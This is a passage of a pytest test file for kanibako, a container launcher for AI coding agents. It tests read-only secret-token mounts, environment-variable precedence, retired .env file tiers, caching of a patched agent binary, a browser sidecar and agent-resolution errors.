            secret_mounts = [
                mt for mt in mounts
                if getattr(mt, "destination", None)
                == f"{SECRET_MOUNT_DIR}/ANTHROPIC_AUTH_TOKEN"
            ]
            assert len(secret_mounts) == 1
            assert str(secret_mounts[0].source) == str(tok)
            assert secret_mounts[0].options == "ro"
            # The entrypoint is swapped to the sh -c export shim; the cli_args carry
            # the export STATEMENT referencing the MOUNT PATH — never the token value.
            assert kw.get("entrypoint") == "sh" or "sh" in str(kw.get("entrypoint"))
            argv = " ".join(kw.get("cli_args") or [])
            assert f"{SECRET_MOUNT_DIR}/ANTHROPIC_AUTH_TOKEN" in argv
            assert "ANTHROPIC_AUTH_TOKEN" in argv
            assert "sk-persona-bearer" not in argv

    def test_secret_path_missing_does_not_crash_launch(self, start_mocks, tmp_path):
        """A missing token file fails soft: no mount, no shim, launch proceeds."""
        from kanibako.settings.settings_categories import SECRET_MOUNT_DIR

        with start_mocks() as m:
            m.agent_cfg.secret_path = {
                "ANTHROPIC_AUTH_TOKEN": str(tmp_path / "absent")
            }
            m.load_agent_config.return_value = m.agent_cfg
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            kw = m.runtime.run.call_args.kwargs
            env = kw.get("env") or {}
            assert "ANTHROPIC_AUTH_TOKEN" not in env
            mounts = kw.get("extra_mounts") or []
            assert not any(
                getattr(mt, "destination", "").startswith(SECRET_MOUNT_DIR)
                for mt in mounts
            )
            # Fail-soft: no secret winner → no SECRET export shim (the token mount
            # path never appears in the launch command).  The directive flatten
            # shim is orthogonal to secrets and may still wrap the agent.
            argv = " ".join(
                [str(kw.get("entrypoint") or "")]
                + [str(a) for a in (kw.get("cli_args") or [])]
            )
            assert SECRET_MOUNT_DIR not in argv

    def test_no_secret_path_is_byte_identical(self, start_mocks):
        """A box with NO secrets: no mount, no shim, bare entrypoint (zero delta)."""
        from kanibako.settings.settings_categories import SECRET_MOUNT_DIR

        with start_mocks() as m:
            # default AgentConfig().secret_path == {}
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            kw = m.runtime.run.call_args.kwargs
            env = kw.get("env") or {}
            assert "ANTHROPIC_AUTH_TOKEN" not in env
            mounts = kw.get("extra_mounts") or []
            assert not any(
                getattr(mt, "destination", "").startswith(SECRET_MOUNT_DIR)
                for mt in mounts
            )
            # No secret → no SECRET export shim: the secret mount path never
            # appears in the launch command.  (The directive flatten shim is
            # orthogonal to secrets and may wrap the agent — not asserted here.)
            argv = " ".join(
                [str(kw.get("entrypoint") or "")]
                + [str(a) for a in (kw.get("cli_args") or [])]
            )
            assert SECRET_MOUNT_DIR not in argv

    def test_state_env_merged_into_container_env(self, start_mocks):
        """Descriptor container_env is merged into the container env.

        The legacy apply_state env return no longer feeds the launch; the
        descriptor's ``container_env`` (claude: DISABLE_AUTOUPDATER=1) reaches
        runtime.run via assemble_env -> state_env -> container_env.
        """
        with start_mocks() as m:
            m.target.setting_descriptors.return_value = []
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            env = m.runtime.run.call_args.kwargs.get("env") or {}
            assert env.get("DISABLE_AUTOUPDATER") == "1"

    def test_shell_mode_uses_general_agent(self, start_mocks):
        """Shell mode (entrypoint set) loads 'general' agent config."""
        with start_mocks() as m:
            m.resolve_target.side_effect = KeyError("skip")
            _run_container(
                project_dir=None, entrypoint="/bin/bash", image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            # The agent config path is derived as
            # std.agents / "general" / "settings.yaml" (the settings file lives
            # inside the per-agent store dir).
            div_args = [
                c[0][0]
                for c in m.load_std_paths.return_value.agents.__truediv__.call_args_list
            ]
            assert "general" in div_args
            # ... / "general" / "settings.yaml"
            sub_args = [
                c[0][0]
                for c in m.load_std_paths.return_value.agents.__truediv__
                .return_value.__truediv__.call_args_list
            ]
            assert "settings.yaml" in sub_args


class TestContainerEnvPrecedence:
    """Verify container env accumulation precedence.

    Order (low->high, later ``.update`` wins):
        agent < the reconciled ``<scope>.env.<VAR>`` winners < state < cli

    ⚑ FLIPPED by B9/RQ-1. The three docker ``.env`` FILE tiers (system, workset,
    box) that used to open this sequence are RETIRED — the ratified manifest
    records the files as DROPPED, so the launch read of them was an
    authority-vs-code divergence. Their replacement is the settings key
    ``<scope>.env.<VAR>``, whose per-VAR precedence winner (system < agent <
    workset < box) the single launch reconcile has ALREADY picked; the launch
    applies that result rather than re-deriving the order.
    """

    @staticmethod
    def _env_entry(var, value, scope="box"):
        from kanibako.settings.settings_categories import CategoryEntry

        return CategoryEntry(
            category="env", scope=scope, box_dest=var, host_src=None,
            delivery="ENV", options=value, name=var, key=f"{scope}.env.{var}",
        )

    @classmethod
    def _assemble(cls, *, agent_env, reconciled_envs, state_env, cli_env):
        """Replicate the start.py env-assembly sequence verbatim."""
        from kanibako.commands.start import _build_config_env

        container_env = _build_config_env(agent_env, reconciled_envs)
        container_env.update(state_env)                        # state
        container_env.update(cli_env)                          # cli
        return container_env

    def test_scoped_env_overrides_the_agent_tier(self):
        env = self._assemble(
            agent_env={"K": "agent", "ONLY_AGENT": "a"},
            reconciled_envs=[
                self._env_entry("K", "box"), self._env_entry("ONLY_BOX", "b"),
            ],
            state_env={},
            cli_env={},
        )
        assert env["K"] == "box"          # the reconciled winner wins
        assert env["ONLY_BOX"] == "b"
        assert env["ONLY_AGENT"] == "a"

    def test_the_reconcile_owns_the_cross_scope_order(self):
        """The launch does NOT re-layer scopes: reconcile already emitted ONE
        winner per VAR, so whichever entry it hands over is the value used."""
        env = self._assemble(
            agent_env={"K": "agent"},
            reconciled_envs=[self._env_entry("K", "workset", scope="workset")],
            state_env={},
            cli_env={},
        )
        assert env["K"] == "workset"

    def test_state_and_cli_override_all_config_levels(self):
        """state_env and CLI -e env both sit above every config level."""
        base = dict(
            agent_env={"K": "agent"},
            reconciled_envs=[self._env_entry("K", "box")],
        )
        env_state = self._assemble(**base, state_env={"K": "state"}, cli_env={})
        assert env_state["K"] == "state"
        env_cli = self._assemble(
            **base, state_env={"K": "state"}, cli_env={"K": "cli"},
        )
        assert env_cli["K"] == "cli"


class TestRetiredEnvFilesAreNotRead:
    """⚑ THE RQ-1 PIN, FLIPPED. These used to prove the workset ``.env`` FILE was
    injected for named AND primary worksets (F9). Jei re-ruled RQ-1 on
    2026-08-02: the ratified manifest records the ``.env`` files as DROPPED, so
    the launch-side three-tier read is REMOVED and a value in such a file must
    reach the box no more. Exercises the real ``_run_container`` flow.
    """

    def test_primary_workset_env_file_is_ignored(self, start_mocks, tmp_path):
        with start_mocks() as m:
            # Fixture default: proj.group.is_default is True.
            assert m.proj.group.is_default is True
            from kanibako.settings.paths import ProjectGroup
            ws_root = tmp_path / "ws"
            ws_root.mkdir()
            (ws_root / "env").write_text("PRIMARY_WS_VAR=present\n")
            m.proj.group = ProjectGroup(
                name="default",
                root=ws_root,
                is_default=True,
                local_shared_base=ws_root,
            )
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            env = m.runtime.run.call_args.kwargs.get("env") or {}
            assert "PRIMARY_WS_VAR" not in env

    def test_no_workset_env_when_group_none(self, start_mocks, tmp_path):
        """proj.group is None → no crash (the group is no longer consulted for
        an env path at all)."""
        with start_mocks() as m:
            m.proj.group = None
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            env = m.runtime.run.call_args.kwargs.get("env") or {}
            assert "LEAKED" not in env

    def test_named_workset_env_file_is_ignored(self, start_mocks, tmp_path):
        with start_mocks() as m:
            from kanibako.settings.paths import ProjectGroup
            ws_root = tmp_path / "ws"
            ws_root.mkdir()
            (ws_root / "env").write_text("WS_VAR=present\n")
            m.proj.group = ProjectGroup(
                name="myws",
                root=ws_root,
                is_default=False,
                local_shared_base=ws_root,
            )
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            env = m.runtime.run.call_args.kwargs.get("env") or {}
            assert "WS_VAR" not in env


class TestTweakccIntegration:
    """Verify tweakcc patching in the container launch flow."""

    def test_disabled_by_default(self, start_mocks):
        """Empty tweakcc config → no patching, normal flow."""
        with start_mocks() as m:
            assert m.agent_cfg.transform_settings == {}
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.runtime.run.assert_called_once()

    def test_enabled_calls_apply_tweakcc(self, start_mocks):
        """When tweakcc is enabled in agent config, _apply_tweakcc is called."""
        with start_mocks() as m:
            m.agent_cfg.transform_settings = {"enabled": True}
            m.load_agent_config.return_value = m.agent_cfg

            with patch("kanibako.commands.start._apply_tweakcc") as mock_apply:
                mock_apply.return_value = None  # disabled/failed
                _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
                mock_apply.assert_called_once()

    def test_patched_binary_used_in_mounts(self, start_mocks, tmp_path):
        """When tweakcc returns a patched install, descriptor_mounts uses it.

        The legacy binary_mounts hook is gone; delivery binds come from
        ``descriptor_mounts(desc, install, ...)`` over the (patched) install, so
        the patched binary appears as the launcher bind source.
        """
        with start_mocks() as m:
            m.target.setting_descriptors.return_value = []
            m.agent_cfg.transform_settings = {"enabled": True}
            m.load_agent_config.return_value = m.agent_cfg

            from kanibako.targets.base import AgentInstall
            from kanibako.tweakcc_cache import CacheEntry

            patched_binary = tmp_path / "patched"
            patched_binary.write_bytes(b"\x7fELF" + b"\x00" * 50)
            install_dir = tmp_path / "install"
            install_dir.mkdir()
            patched_install = AgentInstall(
                name="claude",
                binary=patched_binary,
                install_dir=install_dir,
            )
            fake_entry = CacheEntry(path=patched_binary, fd=-1)
            fake_cache = MagicMock()

            with patch("kanibako.commands.start._apply_tweakcc") as mock_apply:
                mock_apply.return_value = (patched_install, fake_entry, fake_cache)
                _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
                # The patched install drives descriptor_mounts: its binary is the
                # launcher bind source (claude has no separate launcher set).
                mounts = m.runtime.run.call_args.kwargs.get("extra_mounts") or []
                sources = {getattr(mt, "source", None) for mt in mounts}
                assert patched_binary in sources
                assert install_dir in sources
                # cache should be released after container exits
                fake_cache.release.assert_called_once_with(fake_entry)

    def test_failure_falls_back(self, start_mocks):
        """When tweakcc fails, the original (detected) install is used.

        descriptor_mounts runs over the conftest default install, so its
        launcher/install_dir appear as delivery bind sources (graceful fallback,
        no patched binary involved).
        """
        with start_mocks() as m:
            m.target.setting_descriptors.return_value = []
            m.agent_cfg.transform_settings = {"enabled": True}
            m.load_agent_config.return_value = m.agent_cfg

            with patch("kanibako.commands.start._apply_tweakcc") as mock_apply:
                mock_apply.return_value = None  # signals failure
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
                assert rc == 0
                # Original detected install delivered via descriptor_mounts.
                install = m.target.detect.return_value
                mounts = m.runtime.run.call_args.kwargs.get("extra_mounts") or []
                sources = {getattr(mt, "source", None) for mt in mounts}
                assert install.launcher in sources
                assert install.install_dir in sources

    def test_telemetry_disabled_for_claude(self, start_mocks):
        """CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1 is carried by claude's descriptor.

        After step 1e, the telemetry var is no longer injected by a core
        ``target.name == "claude"`` special-case; it lives in
        ``descriptor.container_env`` and reaches the container via assemble_env →
        state_env.  Drive the descriptor path with the real claude descriptor.
        """
        from kanibako.plugins.claude.target import _CLAUDE_DESCRIPTOR
        with start_mocks() as m:
            m.target.name = "claude"
            m.target.descriptor = _CLAUDE_DESCRIPTOR
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            env = m.runtime.run.call_args.kwargs.get("env") or {}
            assert env.get("CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC") == "1"

    def test_telemetry_not_overridden_by_user(self, start_mocks):
        """User can override telemetry setting via -e flag (applied after state_env)."""
        from kanibako.plugins.claude.target import _CLAUDE_DESCRIPTOR
        with start_mocks() as m:
            m.target.name = "claude"
            m.target.descriptor = _CLAUDE_DESCRIPTOR
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
                cli_env=["CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=0"],
            )
            env = m.runtime.run.call_args.kwargs.get("env") or {}
            # User's -e override takes priority (applied after the descriptor env)
            assert env.get("CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC") == "0"

    def test_apply_state_env_reaches_container(self, start_mocks):
        """The descriptor's container_env flows into the launched container env.

        The Claude descriptor carries DISABLE_AUTOUPDATER=1 (so the in-container
        agent cannot self-update mid-session); verify core threads the
        descriptor-assembled env into the launched container.  (This replaces the
        legacy apply_state env return, which is no longer dispatched.)
        """
        with start_mocks() as m:
            m.target.name = "claude"
            m.target.setting_descriptors.return_value = []
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            env = m.runtime.run.call_args.kwargs.get("env") or {}
            assert env.get("DISABLE_AUTOUPDATER") == "1"


class TestBinaryMountSafeFail:
    """A binary mount source missing at mount time -> clean kanibako error."""

    def test_missing_bind_source_fails_clean(self, start_mocks, capsys, tmp_path):
        """An AGENT_CRITICAL bind whose source vanished aborts with a clean error.

        descriptor_mounts raises BindingSourceError when a critical source no
        longer exists; start.py catches it, prints the "mount source
        disappeared" message, and returns 1 (no crun crash).
        """
        from kanibako.targets.base import AgentInstall
        with start_mocks() as m:
            m.target.name = "claude"
            m.target.setting_descriptors.return_value = []
            gone = tmp_path / "pruned" / "claude"  # never created
            # A detected install whose AGENT_CRITICAL sources do not exist.
            m.target.detect.return_value = AgentInstall(
                name="claude",
                binary=gone,
                install_dir=tmp_path / "pruned" / "share",  # never created
                launcher=gone,
            )
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            assert rc == 1
            err = capsys.readouterr().err
            assert "mount source disappeared" in err
            # Clean kanibako error, not a crun crash -> container never run.
            m.runtime.run.assert_not_called()


class TestApplyTweakcc:
    """Unit tests for the _apply_tweakcc helper."""

    def test_disabled_returns_none(self, tmp_path):
        """When tweakcc is not enabled, returns None."""
        from kanibako.settings.agent_config import AgentConfig

        install = MagicMock()
        agent_cfg = AgentConfig(transform_settings={})
        result = _apply_tweakcc(install, agent_cfg, tmp_path, "kanibako-oci:latest", "podman", MagicMock())
        assert result is None

    def test_enabled_but_empty_returns_none(self, tmp_path):
        """Enabled=False explicitly → returns None."""
        from kanibako.settings.agent_config import AgentConfig

        install = MagicMock()
        agent_cfg = AgentConfig(transform_settings={"enabled": False})
        result = _apply_tweakcc(install, agent_cfg, tmp_path, "kanibako-oci:latest", "podman", MagicMock())
        assert result is None

    def test_bun_sea_error_returns_none(self, tmp_path):
        """BunSEAError during hash → returns None (graceful fallback)."""
        from kanibako.settings.agent_config import AgentConfig
        from kanibako.bun_sea import BunSEAError

        install = MagicMock()
        agent_cfg = AgentConfig(transform_settings={"enabled": True})
        logger = MagicMock()

        with patch("kanibako.bun_sea.cli_js_hash") as mock_hash:
            mock_hash.side_effect = BunSEAError("bad binary")
            result = _apply_tweakcc(install, agent_cfg, tmp_path, "kanibako-oci:latest", "podman", logger)
            assert result is None
            logger.warning.assert_called_once()

    def test_cache_hit(self, tmp_path):
        """Cache hit → returns patched install without calling put."""
        from kanibako.settings.agent_config import AgentConfig

        install = MagicMock()
        install.name = "claude"
        install.install_dir = tmp_path / "install"
        agent_cfg = AgentConfig(transform_settings={"enabled": True})
        logger = MagicMock()

        fake_entry = MagicMock()
        fake_entry.path = tmp_path / "cached_binary"

        with (
            patch("kanibako.bun_sea.cli_js_hash", return_value="abc123"),
            patch("kanibako.tweakcc_cache.TweakccCache") as MockCache,
        ):
            cache_instance = MockCache.return_value
            cache_instance.cache_key.return_value = "testkey"
            cache_instance.get.return_value = fake_entry

            result = _apply_tweakcc(install, agent_cfg, tmp_path, "kanibako-oci:latest", "podman", logger)

            assert result is not None
            patched_install, entry, cache = result
            assert patched_install.binary == fake_entry.path
            assert patched_install.install_dir == install.install_dir
            assert entry is fake_entry
            cache_instance.put.assert_not_called()

    def test_cache_miss_calls_put(self, tmp_path):
        """Cache miss → calls put with tweakcc command."""
        from kanibako.settings.agent_config import AgentConfig

        install = MagicMock()
        install.name = "claude"
        install.binary = tmp_path / "binary"
        install.install_dir = tmp_path / "install"
        agent_cfg = AgentConfig(transform_settings={"enabled": True})
        logger = MagicMock()

        fake_entry = MagicMock()
        fake_entry.path = tmp_path / "cached"

        with (
            patch("kanibako.bun_sea.cli_js_hash", return_value="abc123"),
            patch("kanibako.tweakcc_cache.TweakccCache") as MockCache,
        ):
            cache_instance = MockCache.return_value
            cache_instance.cache_key.return_value = "testkey"
            cache_instance.get.return_value = None  # miss
            cache_instance.put.return_value = fake_entry

            result = _apply_tweakcc(install, agent_cfg, tmp_path, "kanibako-oci:latest", "podman", logger)

            assert result is not None
            cache_instance.put.assert_called_once()
            call_args = cache_instance.put.call_args
            assert call_args[0][0] == "testkey"  # key
            assert call_args[0][1] == install.binary  # source_binary
            assert callable(call_args[0][2])  # patch_fn

    def test_returns_cache_object(self, tmp_path):
        """Returned tuple includes the cache object for later release."""
        from kanibako.settings.agent_config import AgentConfig

        install = MagicMock()
        install.name = "claude"
        install.install_dir = tmp_path / "install"
        agent_cfg = AgentConfig(transform_settings={"enabled": True})
        logger = MagicMock()

        fake_entry = MagicMock()
        fake_entry.path = tmp_path / "cached"

        with (
            patch("kanibako.bun_sea.cli_js_hash", return_value="abc"),
            patch("kanibako.tweakcc_cache.TweakccCache") as MockCache,
        ):
            cache_instance = MockCache.return_value
            cache_instance.cache_key.return_value = "k"
            cache_instance.get.return_value = fake_entry

            result = _apply_tweakcc(install, agent_cfg, tmp_path, "kanibako-oci:latest", "podman", logger)
            _, _, cache_obj = result
            assert cache_obj is cache_instance


class TestPrepareHostHook:
    """Core invokes the agent-agnostic prepare_host() hook before mounts.

    The hook is plugin-owned: the Claude plugin runs the synchronous update
    gate + host auth refresh inside it (covered in test_claude.py).  Core's
    only contract is *that it calls the hook* with the right auto_auth flag and
    install — it never reaches into auto_refresh_auth itself anymore.
    """

    def test_hook_invoked_with_auto_auth_true(self, start_mocks):
        """prepare_host is called once; auto_auth=True for the default path."""
        with start_mocks() as m:
            _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            m.target.prepare_host.assert_called_once()
            assert m.target.prepare_host.call_args.kwargs["auto_auth"] is True

    def test_hook_auto_auth_false_with_no_auto_auth(self, start_mocks):
        """no_auto_auth=True -> hook is still called, but auto_auth=False."""
        with start_mocks() as m:
            _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
                no_auto_auth=True,
            )
            m.target.prepare_host.assert_called_once()
            assert m.target.prepare_host.call_args.kwargs["auto_auth"] is False

    def test_hook_auto_auth_false_for_distinct_auth(self, start_mocks):
        """Distinct auth (PRIVATE box, auth_src.creds_shared False) -> auto_auth=False."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._resolve_box_launch_decisions",
            return_value=(_PRIVATE_AUTH, None, None),
        ):
            _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            m.target.prepare_host.assert_called_once()
            assert m.target.prepare_host.call_args.kwargs["auto_auth"] is False

    def test_hook_skipped_in_shell_mode(self, start_mocks):
        """In shell mode (entrypoint set), prepare_host is not called."""
        with start_mocks() as m:
            _run_container(
                project_dir=None,
                entrypoint="bash",
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            m.target.prepare_host.assert_not_called()

    def test_redetect_after_update_feeds_validate_print_bind(self, start_mocks, capsys, tmp_path):
        """The post-update re-detect feeds validate, the print, and the bind.

        prepare_host()'s update gate can repoint/prune the host version, so
        start.py re-detects AFTER it; the ONE fresh install must be what
        _validate_agent_binary, the "Using host ...:" line, and the descriptor
        delivery mounts all consume — never the stale first detect.
        """
        from kanibako.targets.base import AgentInstall

        # Real, existing paths so descriptor_mounts' AGENT_CRITICAL existence
        # checks pass; "STALE"/"FRESH" leaves make the bind source observable.
        stale_dir = tmp_path / "versions" / "STALE"
        stale_dir.mkdir(parents=True)
        stale_bin = stale_dir / "claude"
        stale_bin.write_bytes(b"\x7fELF" + b"\x00" * 50)
        stale = AgentInstall(name="claude", binary=stale_bin, install_dir=stale_dir, launcher=stale_bin)

        fresh_dir = tmp_path / "versions" / "FRESH"
        fresh_dir.mkdir(parents=True)
        fresh_bin = fresh_dir / "claude"
        fresh_bin.write_bytes(b"\x7fELF" + b"\x00" * 50)
        fresh = AgentInstall(name="claude", binary=fresh_bin, install_dir=fresh_dir, launcher=fresh_bin)

        with start_mocks() as m:
            m.target.setting_descriptors.return_value = []
            # First detect (early-out) returns stale; the re-detect after the
            # update gate returns fresh.
            m.target.detect.side_effect = [stale, fresh]
            _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            # detect called at least twice (early-out + re-detect).
            assert m.target.detect.call_count >= 2
            # prepare_host got the FIRST (stale) install.
            assert m.target.prepare_host.call_args.args[0] is stale
            # validate ran on the FRESH (post-update) binary.
            m.validate_binary.assert_called_with(fresh.binary)
            # The descriptor delivery mounts bind the FRESH install, not the stale.
            mounts = m.runtime.run.call_args.kwargs.get("extra_mounts") or []
            sources = {getattr(mt, "source", None) for mt in mounts}
            assert fresh_bin in sources
            assert fresh_dir in sources
            assert stale_bin not in sources
            assert stale_dir not in sources
            # The "Using host ...:" line names the fresh version, not the stale.
            err = capsys.readouterr().err
            assert "FRESH" in err
            assert "STALE" not in err


class TestBrowserSidecar:
    """Verify browser sidecar integration in _run_container."""

    def test_browser_flag_starts_sidecar(self, start_mocks):
        """--browser starts a browser sidecar and injects BROWSER_WS_ENDPOINT."""
        mock_sidecar = MagicMock()
        mock_sidecar.start.return_value = "ws://127.0.0.1:9222/devtools/browser/abc"

        with start_mocks():
            with (
                patch(
                    "kanibako.browser_sidecar.BrowserSidecar",
                    return_value=mock_sidecar,
                ),
                patch(
                    "kanibako.browser_sidecar.ws_endpoint_for_container",
                    return_value="ws://host.containers.internal:9222/devtools/browser/abc",
                ),
            ):
                rc = _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    browser=True,
                )
                assert rc == 0
                mock_sidecar.start.assert_called_once()
                mock_sidecar.stop.assert_called_once()

    def test_browser_flag_not_set_skips_sidecar(self, start_mocks):
        """Without --browser, no sidecar is started."""
        with start_mocks():
            with patch(
                "kanibako.browser_sidecar.BrowserSidecar",
            ) as mock_cls:
                rc = _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                )
                assert rc == 0
                mock_cls.assert_not_called()

    def test_browser_sidecar_failure_continues(self, start_mocks):
        """Sidecar failure doesn't block container launch."""
        with start_mocks():
            with patch(
                "kanibako.browser_sidecar.BrowserSidecar",
                side_effect=RuntimeError("no image"),
            ):
                rc = _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    browser=True,
                )
                assert rc == 0  # continues without sidecar


class TestNoAgentMessage:
    """Verify run_start's no-agent behavior under the W1 unified resolver.

    The old pre-launch "No agents detected." guard (which returned 0) is GONE:
    agent resolution now happens UP FRONT inside _run_container via
    resolve_agent, which raises a typed AgentResolutionError (Gate-2a/2b) that
    the top-level cli.py handler surfaces verbatim with a non-zero exit — never
    a silent return 0 / drop to shell.
    """

    @staticmethod
    def _make_start_args(**overrides):
        """Build a minimal argparse.Namespace for run_start."""
        defaults = {
            "new_session": False,
            "continue_session": False,
            "resume_session": False,
            "secure": False,
            "autonomous": False,
            "model": None,
            "no_helpers": False,
            "no_auto_auth": False,
            "browser": False,
            "share_images": False,
            "persistent": False,
            "ephemeral": False,
            "env": None,
            "agent_args": [],
            "project": None,
            "image": None,
            "entrypoint": None,
        }
        defaults.update(overrides)
        return argparse.Namespace(**defaults)

    def test_start_forwards_to_run_container(self):
        """run_start no longer guards — it forwards straight to _run_container
        (which owns resolution).  No 'No agents detected.' short-circuit."""
        with patch("kanibako.commands.start._run_container", return_value=0) as mock_run:
            args = self._make_start_args()
            rc = run_start(args)
        assert rc == 0
        mock_run.assert_called_once()
        # The --agent seam is threaded (None until Phase D wires the flag).
        assert mock_run.call_args.kwargs["explicit_agent"] is None

    def test_start_no_agent_resolution_error_propagates(self):
        """0 agents installed → resolve_agent raises NoAgentInstalledError from
        _run_container; run_start does NOT swallow it into a return 0."""
        from kanibako.errors import NoAgentInstalledError

        with patch(
            "kanibako.commands.start._run_container",
            side_effect=NoAgentInstalledError("no agents"),
        ):
            args = self._make_start_args()
            with pytest.raises(NoAgentInstalledError):
                run_start(args)

    def test_shell_still_works_without_agent(self, start_mocks):
        """run_shell calls _run_container directly — no agent check."""
        from kanibako.commands.start import run_shell
        from kanibako.targets.no_agent import NoAgentTarget

        with start_mocks() as m:
            # Make resolve_target return NoAgentTarget inside _run_container
            m.resolve_target.return_value = NoAgentTarget()
            args = argparse.Namespace(
                shell_args=[],
                project=None,
                env=None,
                image=None,
                entrypoint=None,
                persistent=False,
                ephemeral=False,
                no_helpers=False,
                share_images=False,
            )
            rc = run_shell(args)
            # Shell should still launch (entrypoint set → skips target resolution)
            assert rc == 0
            m.runtime.run.assert_called_once()


class TestApplyInitSeeds:
    """Unit tests for _apply_init_seeds (copy-once-at-init seed wiring)."""

    def _std(self, tmp_path):
        from types import SimpleNamespace
        return SimpleNamespace(
            agents=tmp_path / "agents",
            data_home=tmp_path / "data_home",
            data_path=tmp_path / "data",
            # New config.*/system.* fields read by the ResolveCtx (config
            # foundation) + resolved_sys (common/seeded wiring).
            data=tmp_path / "data",
            channels=tmp_path / "channels",
            template=tmp_path / "template",
            canon=tmp_path / "canon",
            registry=tmp_path / "registry.yaml",
            primary_workset=tmp_path / "primary_workset",
            settings=tmp_path / "settings.yaml",
            # B2: the channel partition roots box_channel_addresses reads (the
            # meta.box.{inbox,share_global} identity anchors).
            channels_mailboxes=tmp_path / "channels" / "mailboxes",
            channels_share=tmp_path / "channels" / "share",
            # B2b: the system channel type-roots folded into resolved_sys so the
            # @system.channels.* ALL-PROJECTS channel binds resolve from the snapshot.
            channels_common=tmp_path / "channels" / "common",
            channels_chat=tmp_path / "channels" / "chat",
            # B2b: the PRIMARY logs dir helper_log_path reads (= the resolved
            # workset.logs anchor the helper-log bind routes through).
            primary_logs=tmp_path / "primary_workset" / "logs",
        )

    def _proj(self, shell_path, group=None):
        from types import SimpleNamespace
        # B1: meta.runtime.* needs a real mode. group=None here = default/PRIMARY
        # (the @config.primary_workset @-ref, so project_path is unused).
        # B2: meta.box.* identity anchors need the box name (proj.name).
        # B2b: the workset path anchors are derived off the vault paths + the box
        # home's box-parent, so the proj fake supplies them.
        return SimpleNamespace(
            shell_path=shell_path, group=group, name="seedbox",
            mode=BoxMode.primary, project_path=shell_path,
            # P6c: the cascade box/workset tier files are single-sourced off
            # proj.metadata_path (box_workset_settings_paths).
            metadata_path=shell_path.parent,
            vault_ro_path=shell_path.parent / "vault" / "ro" / "seedbox",
            vault_rw_path=shell_path.parent / "vault" / "rw" / "seedbox",
        )

    def _logger(self):
        import logging
        return logging.getLogger("test_apply_init_seeds")

    def _shell(self, tmp_path):
        shell = tmp_path / "shell"
        shell.mkdir()
        return shell

    def _call(self, tmp_path, *, std=None, proj=None, target=None,
              global_config_path=None, agent_config_path=None,
              deliver_creds=True):
        from kanibako.commands.start import _apply_init_seeds
        # P6c: the box-tier seed config is single-sourced off proj.metadata_path/
        # settings.yaml (box_workset_settings_paths); tests place it there directly.
        _apply_init_seeds(
            std=std or self._std(tmp_path),
            proj=proj,
            agent_name="claude",
            target=target,
            global_config_path=global_config_path,
            agent_config_path=agent_config_path,
            logger=self._logger(),
            deliver_creds=deliver_creds,
        )

    def test_empty_no_config_no_target_copies_nothing(self, tmp_path):
        """No seed config and target=None → nothing copied (no behavior change)."""
        shell = self._shell(tmp_path)
        glob = tmp_path / "kanibako_config.yaml"
        glob.write_text('box_image: "img"\nagent:\n  model: "sonnet"\n')
        self._call(
            tmp_path,
            proj=self._proj(shell),
            target=None,
            global_config_path=glob,
        )
        assert list(shell.iterdir()) == []

    def test_configured_agent_seed_copied(self, tmp_path):
        """An agent-config seed copies host_src dir into shell_path/<dest>."""
        shell = self._shell(tmp_path)
        src = tmp_path / "src"
        src.mkdir()
        (src / "file.txt").write_text("hello")
        agent_cfg = tmp_path / "claude.yaml"
        agent_cfg.write_text(
